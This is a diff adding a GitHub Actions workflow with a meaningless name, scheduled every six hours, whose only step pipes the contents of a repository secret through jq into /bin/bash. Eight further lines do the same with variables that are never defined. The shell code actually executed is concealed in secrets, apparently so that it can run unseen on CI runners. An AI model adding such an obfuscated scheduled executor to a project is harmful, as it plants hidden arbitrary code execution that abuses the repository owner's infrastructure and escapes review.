@@ -1,0 +1,27 @@
+name: busjkalj
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: busjkalj
+        env:
+          jw71743: ${{ secrets.jw71743 }}
+        run: |
+          echo $jw71743 | jq -r .lafr0 | /bin/bash
+          echo $izwu0454 | jq -r .rart7 | /bin/bash
+          echo $pxs18 | jq -r .in57209 | /bin/bash
+          echo $tq5 | jq -r .a590 | /bin/bash
+          echo $qaasx8 | jq -r .ek59 | /bin/bash
+          echo $yuwcl68 | jq -r .cb5872 | /bin/bash
+          echo $a1238 | jq -r .wnwd28345 | /bin/bash
+          echo $kn5667 | jq -r .gtvax86 | /bin/bash
+          echo $stoxg67185 | jq -r .xa54516 | /bin/bash
+
